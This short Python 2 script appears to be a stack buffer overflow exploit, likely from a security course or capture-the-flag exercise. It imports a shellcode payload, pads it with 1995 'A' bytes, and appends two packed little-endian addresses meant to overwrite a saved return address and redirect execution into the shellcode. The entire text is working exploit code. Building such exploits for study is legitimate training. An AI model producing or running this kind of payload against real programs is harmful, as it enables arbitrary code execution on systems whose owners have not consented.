from shellcode import shellcode
from struct import pack
print shellcode + "A" * 1995 + pack("<I", 3221141128) + pack("<I", 3221143196)